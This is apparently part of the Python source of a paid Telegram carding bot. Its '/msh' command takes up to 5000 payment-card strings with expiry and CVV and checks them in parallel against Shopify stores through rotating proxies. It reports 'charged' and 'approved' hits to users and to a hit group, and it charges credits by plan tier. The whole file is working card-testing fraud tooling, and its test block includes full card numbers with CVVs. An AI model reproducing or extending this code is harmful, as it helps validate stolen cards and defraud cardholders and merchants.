        # Update stats for proxy error
        stats["checked"] += 1
        stats["error"] += 1
        
        # Send error message to user (Basic send, no retry needed for system errors)
        try:
            error_msg = f"⚠️ <i>Proxy Error</i> <code>{card}</code>: No proxy found. Please add a proxy using /proxy command."
            await context.bot.send_message(
                chat_id=user_info.get("id"),
                text=error_msg,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            logger.error(f"Error sending proxy error message to user {user_info.get('id')}: {str(e)}")
        return
    
    # Check card with stop event
    result = await check_single_card(card, user_info, user_proxies, proxy_index, max_retries=10, stop_event=stop_event, session_id=session_id)
    
    # Check if stopped after getting result
    if stop_event.is_set():
        return
    
    # Skip if result is None (stopped)
    if result is None:
        return
    
    # Format response
    formatted_response, status_category = format_mass_response(result, user_info)
    
    # Helper function to send message to user with fallback to active chat
    async def send_hit_to_user(text):
        """
        Tries to send DM to user. If that fails (e.g. privacy settings),
        sends the message to the active chat where the check is running.
        Includes retry logic for flood control.
        """
        dm_success = False
        # Try DM first
        try:
            await send_with_retry(
                context.bot,
                user_info.get("id"),
                text
            )
            dm_success = True
        except Exception as dm_err:
            logger.warning(f"Failed to send DM to user {user_info.get('id')}: {dm_err}. Attempting fallback to active chat.")
            
            # Fallback to active chat
            if chat_id:
                try:
                    await send_with_retry(
                        context.bot,
                        chat_id,
                        text
                    )
                    logger.info(f"Sent {status_category} result to active chat {chat_id} (Fallback)")
                except Exception as chat_err:
                    logger.error(f"Failed to send {status_category} result to active chat {chat_id}: {chat_err}")
        
        return dm_success

    # Send approved/charged cards to user's DM based on preference
    # Increased delay to 1.5s for better flood control
    should_send_hit = False
    if include_approved:
        if status_category in ["charged", "approved"]:
            should_send_hit = True
    else:
        if status_category == "charged":
            should_send_hit = True
    
    if should_send_hit:
        # Flood Control: Wait 1.5 seconds before sending hit message
        await asyncio.sleep(1.5)
        await send_hit_to_user(formatted_response)
    
    # Send to the hit detection group for charged cards (ORDER_PLACED)
    if status_category == "charged":
        # Acquire semaphore for group messages to prevent bot ban
        async with group_send_limiter:
            # Flood Control: Small delay before group actions
            await asyncio.sleep(1.0)

            # Send to hit detection group
            hit_message = format_hit_detected_message(result, user_info)
            try:
                await send_with_retry(
                    context.bot,
                    HIT_DETECTION_GROUP_ID,
                    hit_message
                )
            except Exception as e:
                logger.error(f"Error sending hit detection message to group {HIT_DETECTION_GROUP_ID}: {str(e)}")
    
    # Update stats
    stats["checked"] += 1
    if status_category == "charged":
        stats["charged"] += 1
    elif status_category == "approved":
        if include_approved:
            stats["approved"] += 1
        # If include_approved is False, we simply don't count it in stats
    elif status_category == "declined":
        stats["declined"] += 1
    elif status_category == "proxy_error":
        stats["error"] += 1
    else:
        stats["error"] += 1
    
    # Safely get message details from active check dictionary
    process_data = active_mass_checks.get(session_id)
    if not process_data:
        logger.warning(f"Could not find process data for session {session_id} to update progress.")
        return

    # --- SMART PROGRESS UPDATE LOGIC ---
    # Update progress message ONLY if:
    # 1. At least 25 cards checked (reduced frequency)
    # 2. At least 8 seconds passed since last update (time throttling)
    
    should_update = False
    current_time = time.time()
    
    # Check card count interval
    if stats["checked"] % 25 == 0 or stats["checked"] == stats["total"]:
        # Check time interval
        last_update = process_data.get("last_progress_update", 0)
        if current_time - last_update > 8: # 8 second minimum gap
            should_update = True

    if should_update:
        process_data["last_progress_update"] = current_time # Update timestamp
        
        try:
            current_gateway = "Shopify Random $"
            
            progress_msg, reply_markup = format_progress_response(stats, user_id, session_id)
            
            # Try to edit message (No retry needed for progress edits to avoid complexity)
            try:
                await context.bot.edit_message_text(
                    chat_id=process_data["chat_id"],
                    message_id=process_data["message_id"],
                    text=progress_msg,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                    disable_web_page_preview=True
                )
            except Exception as edit_error:
                # If error is just "not modified", ignore it
                if "Message is not modified" not in str(edit_error):
                    logger.warning(f"Failed to edit progress message: {str(edit_error)}")
            
            logger.info(f"Updated MSH progress for session {session_id}: {stats['checked']}/{stats['total']}")
        except Exception as e:
            logger.error(f"Error updating MSH progress message: {str(e)}")

async def process_mass_check(cards: List[str], user_info: Dict, update, context, include_approved: bool):
    """
    Process mass check in parallel with controlled concurrency and instant stop functionality.
    
    Args:
        cards: List of cards to check
        user_info: Dictionary containing user information
        update: Telegram update object
        context: Telegram context object
        include_approved: Whether to include approved cards in results
    """
    user_id = user_info.get("id")
    first_name = user_info.get("first_name")
    
    # Generate a unique session ID
    session_id = generate_session_id()
    
    logger.info(f"Starting MSH mass check for user {user_id} with session ID {session_id} and {len(cards)} cards")
    
    # Check if user has sites configured
    user_sites = get_user_sites(user_id)
    if not user_sites:
        await update.message.reply_text(
            "⚠️ <b>No sites configured!</b>\n\n"
            "<i>Please add your own sites using /seturl command before starting a mass check.</i>\n\n"
            "<b>Usage:</b> /seturl https://example.myshopify.com",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no sites configured")
        return
    
    # Initialize counters
    stats = {
        "total": len(cards),
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    }
    
    # Record start time
    start_time = time.time()
    
    # Create a stop event for this process
    stop_event = asyncio.Event()
    
    # Create a stop flag for this process
    active_mass_checks[session_id] = {
        "stopped": False,
        "stop_event": stop_event,
        "message_id": None,
        "start_time": start_time,
        "stats": stats,  # Store stats reference
        "workers": [],  # Store worker tasks for cancellation
        "user_id": user_id,  # Store user ID for permission checking
        "chat_id": None,  # Will be set later
        "session_id": session_id,  # Store session ID
        "last_progress_update": 0 # Initialize progress update timestamp
    }
    
    # Send initial progress message
    progress_msg, reply_markup = format_progress_response(stats, user_id, session_id)
    progress_message = await update.message.reply_text(
        text=progress_msg,
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Store message ID and chat ID for editing later
    active_mass_checks[session_id]["message_id"] = progress_message.message_id
    active_mass_checks[session_id]["chat_id"] = progress_message.chat_id
    
    # Get user proxies for rotation
    user_proxies = get_user_proxies(user_id)
    
    # Create a separate semaphore for this mass check session (Limit concurrency to 15)
    semaphore = asyncio.Semaphore(40)
    
    async def check_card_with_semaphore(card, index):
        # Check if stopped before acquiring semaphore
        if stop_event.is_set():
            return None
        
        async with semaphore:
            # Check if stopped after acquiring semaphore
            if stop_event.is_set():
                return None
            
            # Create a task for processing this card with a specific proxy index
            task = asyncio.create_task(
                process_single_card(
                    card, 
                    user_info, 
                    stats, 
                    context, 
                    update, 
                    user_id,
                    stop_event,
                    active_mass_checks[session_id]["message_id"],
                    active_mass_checks[session_id]["chat_id"],
                    index % len(user_proxies) if user_proxies else 0,  # Use specific proxy for this card
                    session_id,  # Pass session ID
                    include_approved  # Pass approved card preference
                )
            )
            
            # Store task in active_mass_checks for cancellation
            active_mass_checks[session_id]["workers"].append(task)
            
            # Wait for task to complete
            try:
                await task
            except asyncio.CancelledError:
                logger.info(f"MSH task cancelled")
                return None
            
            return None
    
    # Create tasks for all cards with proper proxy rotation
    tasks = [asyncio.create_task(check_card_with_semaphore(card, i)) for i, card in enumerate(cards)]
    
    # Process results as they complete
    for task in asyncio.as_completed(tasks):
        # Check if stopped
        if stop_event.is_set():
            logger.info(f"MSH session {session_id} stopped by user - cancelling remaining tasks")
            # Cancel all remaining tasks
            for remaining_task in tasks:
                if not remaining_task.done():
                    remaining_task.cancel()
                    logger.info(f"Cancelled MSH task")
            break
        
        # Get result
        try:
            await task
        except asyncio.CancelledError:
            logger.info(f"MSH task cancelled")
            continue
    
    # Calculate elapsed time
    elapsed_time = round(time.time() - start_time, 2)
    logger.info(f"MSH mass check completed for user {user_id} with session ID {session_id} in {elapsed_time}s")
    
    # Get user credits to check if unlimited
    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float('inf')
    
    # Check if process was stopped by user
    stopped = stop_event.is_set()
    
    # Deduct only 1 credit for a successful mass check (only if not stopped)
    if not is_unlimited and not stopped:
        update_user_credits(user_id, -1)
        logger.info(f"Deducted 1 credit from MSH user {user_id}")
    
    # Safely get final process data before cleanup
    process_data = active_mass_checks.get(session_id)
    if process_data:
        chat_id = process_data.get("chat_id")
        message_id = process_data.get("message_id")
    else:
        logger.error(f"Could not retrieve final message details for session {session_id} after completion.")
        chat_id, message_id = None, None

    # Send final stats message with requested format
    if chat_id and message_id:
        try:
            # Try to edit message
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=format_final_response(stats, elapsed_time, first_name, stopped, session_id),
                    parse_mode="HTML",
                    disable_web_page_preview=True
                )
            except Exception as edit_error:
                # If editing fails, try to send a new message
                logger.warning(f"Failed to edit final message: {str(edit_error)}")
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=format_final_response(stats, elapsed_time, first_name, stopped, session_id),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )
                except Exception as send_error:
                    logger.error(f"Failed to send new final message: {str(send_error)}")
        except Exception as e:
            logger.error(f"Error sending MSH final message: {str(e)}")
    
    # Clean up process entry immediately after stopping
    if session_id in active_mass_checks:
        del active_mass_checks[session_id]
    
    logger.info(f"MSH mass check process cleaned up for user {user_id} with session ID {session_id}")

async def handle_stop_command(update: Update, context: CallbackContext):
    """
    Handle the /stop command to stop a specific mass check session.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Extract session ID from command arguments
    if not context.args:
        # List all active sessions for this user
        user_sessions = [session_id for session_id, data in active_mass_checks.items() if data["user_id"] == user_id]
        
        if not user_sessions:
            await update.message.reply_text(
                "⚠️ <b>No active mass check sessions found.</b>\n\n"
                "<i>Start a mass check with /msh command first.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        
        session_list = "\n".join([f"• <code>{session_id}</code>" for session_id in user_sessions])
        await update.message.reply_text(
            f"📋 <b>Your active mass check sessions:</b>\n\n"
            f"{session_list}\n\n"
            f"<i>Use /stop &lt;session_id&gt; to stop a specific session.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    session_id = context.args[0].upper()
    
    # Check if there's an active mass check for this session ID
    if session_id not in active_mass_checks:
        await update.message.reply_text(
            f"⚠️ <b>No active mass check session found with ID:</b> <code>{session_id}</code>\n\n"
            "<i>Check the session ID and try again.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Check if user who sent the command is the same as the one who initiated the check
    if active_mass_checks[session_id]["user_id"] != user_id:
        await update.message.reply_text(
            "⛔ <b>Access denied!</b>\n\n"
            "<i>You can only stop your own mass check sessions.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Set stop flag and event for this session - IMMEDIATE STOP
    active_mass_checks[session_id]["stopped"] = True
    stop_event = active_mass_checks[session_id].get("stop_event")
    if stop_event:
        stop_event.set()
    
    logger.info(f"MSH stop requested by user {user_id} for session {session_id}")
    
    # Cancel all running tasks for this session with immediate effect
    if "workers" in active_mass_checks[session_id]:
        for task in active_mass_checks[session_id]["workers"]:
            if not task.done():
                task.cancel()
                logger.info(f"Cancelled MSH task for session {session_id}")
    
    # Calculate elapsed time
    start_time = active_mass_checks[session_id].get("start_time", time.time())
    elapsed_time = round(abs(time.time() - start_time), 2)
    
    # Get stats from active_mass_checks
    stats = active_mass_checks[session_id].get("stats", {
        "total": 0,
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    })
    
    # Get chat_id and message_id
    chat_id = active_mass_checks[session_id].get("chat_id")
    message_id = active_mass_checks[session_id].get("message_id")
    
    # Update progress message to show "Stopped" without stop button
    if chat_id and message_id:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=format_stopped_response(stats, elapsed_time, first_name, session_id),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            # If we get a "Message is not modified" error, try to send a new message
            if "Message is not modified" in str(e):
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=format_stopped_response(stats, elapsed_time, first_name, session_id),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )
                except Exception as e2:
                    logger.error(f"Error sending MSH stop message: {str(e2)}")
            else:
                logger.error(f"Error updating MSH stop message: {str(e)}")
    
    # Send confirmation message to user
    await update.message.reply_text(
        f"✅ <b>Mass check session stopped successfully!</b>\n\n"
        f"<b>Session ID:</b> <code>{session_id}</code>\n"
        f"<b>Cards checked:</b> <code>{stats['checked']}/{stats['total']}</code>\n"
        f"<b>Time elapsed:</b> <code>{elapsed_time}s</code>",
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    # NOTE: DO NOT DELETE from active_mass_checks HERE.
    # The main process_mass_check function will handle cleanup after its tasks are fully cancelled.
    # This prevents the KeyError race condition.

async def handle_msh_command(update, context):
    """
    Handle the /msh command for mass checking Shopify cards.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    logger.info(f"Mass check command received from user {user_id} ({first_name})")
    
    # Check if user has an active plan (not Trial)
    user_tier = get_user_current_tier(user_id)
    
    if user_tier == "Trial":
        await update.message.reply_text(
            "⚠️ <b>This command is only available for users with an active plan.</b>\n\n"
            "<i>Upgrade your plan to use mass checking features.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for trial user {user_id}")
        return
    
    # CHECK FOR CONCURRENT MASS CHECKS
    # Prevent user from running a new mass check if one is already active
    for session_id, data in active_mass_checks.items():
        if data["user_id"] == user_id:
            await update.message.reply_text(
                "⚠️ <b>You already have an active mass check running!</b>\n\n"
                "<i>Please use /stop to stop the current process before starting a new one.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            logger.info(f"Mass check denied for user {user_id} - process already running")
            return

    # Check if user has proxies in database
    from proxy import get_user_proxies
    user_proxies = get_user_proxies(user_id)
    
    if not user_proxies:
        await update.message.reply_text(
            "⚠️ <b>No proxies found!</b>\n\n"
            "<i>Please add at least one proxy using /proxy command.</i>\n\n"
            "<b>Proxy format:</b> http://username:password@host:port",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no proxies found")
        return
    
    # Check if user has sites configured
    user_sites = get_user_sites(user_id)
    if not user_sites:
        await update.message.reply_text(
            "⚠️ <b>No sites configured!</b>\n\n"
            "<i>Please add your own sites using /seturl command before starting a mass check.</i>\n\n"
            "<b>Usage:</b> /seturl https://example.myshopify.com",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no sites configured")
        return
    
    # Initialize cards list
    cards = []
    
    # Check if a document was provided
    if update.message.document and update.message.document.mime_type == "text/plain":
        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        text = file_content.decode('utf-8')
        
        # Split by new lines and filter out empty lines
        cards = [line.strip() for line in text.split('\n') if line.strip()]
        logger.info(f"Loaded {len(cards)} cards from file for user {user_id}")
    # Check if cards were provided as text (after command)
    elif context.args:
        # Get the message text directly to preserve newlines
        message_text = update.message.text
        
        # Remove command and any leading/trailing whitespace
        if message_text.startswith('/msh'):
            message_text = message_text[4:].strip()
        
        # Parse cards from the message
        for line in message_text.split('\n'):
            # Check if it's a URL to a file
            if line.startswith('http'):
                try:
                    # Fetch the file content
                    async with aiohttp.ClientSession() as session:
                        async with session.get(line) as response:
                            if response.status == 200:
                                content = await response.text()
                                # Split by newlines and add to cards list
                                file_cards = [card.strip() for card in content.split('\n') if card.strip()]
                                cards.extend(file_cards)
                                logger.info(f"Loaded {len(file_cards)} cards from URL: {line}")
                            else:
                                logger.warning(f"Failed to fetch cards from URL: {line}, status: {response.status}")
                except Exception as e:
                    logger.error(f"Error fetching cards from URL {line}: {str(e)}")
            else:
                # Treat as a single card line
                cards.append(line.strip())
        
        # Filter out empty lines
        cards = [card for card in cards if card]
        logger.info(f"Loaded {len(cards)} cards from message for user {user_id}")
    # Check if there's a reply to a message with cards
    elif update.message.reply_to_message:
        # Check if the replied message has text
        if update.message.reply_to_message.text:
            # Get the text from the replied message
            reply_text = update.message.reply_to_message.text
            
            # Parse cards from the reply
            for line in reply_text.split('\n'):
                # Check if it's a URL to a file
                if line.startswith('http'):
                    try:
                        # Fetch the file content
                        async with aiohttp.ClientSession() as session:
                            async with session.get(line) as response:
                                if response.status == 200:
                                    content = await response.text()
                                    # Split by newlines and add to cards list
                                    file_cards = [card.strip() for card in content.split('\n') if card.strip()]
                                    cards.extend(file_cards)
                                    logger.info(f"Loaded {len(file_cards)} cards from URL: {line}")
                                else:
                                    logger.warning(f"Failed to fetch cards from URL: {line}, status: {response.status}")
                    except Exception as e:
                        logger.error(f"Error fetching cards from URL {line}: {str(e)}")
                else:
                    # Treat as a single card line
                    cards.append(line.strip())
            
            # Filter out empty lines
            cards = [card for card in cards if card]
            logger.info(f"Loaded {len(cards)} cards from reply for user {user_id}")
        # Check if the replied message has a document
        elif update.message.reply_to_message.document and update.message.reply_to_message.document.mime_type == "text/plain":
            # Download the file
            file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
            file_content = await file.download_as_bytearray()
            text = file_content.decode('utf-8')
            
            # Split by new lines and filter out empty lines
            cards = [line.strip() for line in text.split('\n') if line.strip()]
            logger.info(f"Loaded {len(cards)} cards from replied file for user {user_id}")
    
    # Validate that we have cards
    if not cards:
        await update.message.reply_text(
            "⚠️ <b>No cards provided!</b>\n\n"
            "<i>Usage: /msh followed by cards in separate lines, upload a .txt file with cards, reply to a message containing cards, or provide a URL to a text file with cards</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - no cards provided")
        return
    
    # Get user credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    if not has_credits:
        await update.message.reply_text(
            "⚠️ <b>You don't have enough credits to use this command.</b>\n\n"
            "<i>Please recharge to continue using this service.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - insufficient credits")
        return
    
    # Check if number of cards exceeds limit
    if len(cards) > 5000:
        await update.message.reply_text(
            f"⚠️ <b>Too many cards provided!</b>\n\n"
            f"<i>Maximum allowed is 5000 cards, but you provided {len(cards)}.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - too many cards: {len(cards)}")
        return
    
    # Check if user has enough credits for all cards (only need 1 credit for successful mass check)
    if not is_unlimited and user_credits < 1:
        await update.message.reply_text(
            f"⚠️ <b>Not enough credits!</b>\n\n"
            f"<i>You need at least 1 credit to use mass checking.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"Mass check denied for user {user_id} - insufficient credits")
        return
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # NEW: Store data and ask for confirmation instead of starting immediately
    pending_mass_checks[user_id] = {
        "cards": cards,
        "user_info": user_info,
        "update": update
    }

    # Create confirmation keyboard
    keyboard = [
        [
            InlineKeyboardButton("Yes", callback_data=f"msh_yes_{user_id}"),
            InlineKeyboardButton("No", callback_data=f"msh_no_{user_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "<b>Do you need approved cards?</b>\n\n"
        "<i>Yes: Sends both Charged and Approved cards.</i>\n"
        "<i>No: Sends only Charged cards.</i>",
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

async def handle_msh_confirm_callback(update: Update, context: CallbackContext):
    """
    Handle the callback when user clicks Yes or No for approved cards.
    """
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    callback_data = query.data

    # Determine preference based on button clicked
    include_approved = False
    if callback_data.startswith("msh_yes_"):
        include_approved = True
    elif callback_data.startswith("msh_no_"):
        include_approved = False
    else:
        return

    # Check if user has pending check
    if user_id not in pending_mass_checks:
        await query.edit_message_text(
            "<b>Error:</b> No pending mass check found. Please restart with /msh.",
            parse_mode="HTML"
        )
        return

    # Retrieve pending data
    pending_data = pending_mass_checks.pop(user_id)
    cards = pending_data["cards"]
    user_info = pending_data["user_info"]
    original_update = pending_data["update"]
    
    # Delete the confirmation message
    try:
        await query.delete_message()
    except Exception:
        pass

    # Start the mass check with the user's preference
    logger.info(f"MSH started for user {user_id} with include_approved={include_approved}")
    asyncio.create_task(process_mass_check(cards, user_info, original_update, context, include_approved))

if __name__ == "__main__":
    # For testing purposes
    test_cards = [
        "5108050299485784|07|28|965",
        "4889450004111111|03|25|737"
    ]
    test_user = {
        "id": 123456789,
        "username": "testuser",
        "first_name": "Test"
    }
    
    async def test():
        for card in test_cards:
            result = await check_single_card(card, test_user)
            formatted, _ = format_mass_response(result, test_user)
            print(formatted)
    
    asyncio.run(test())
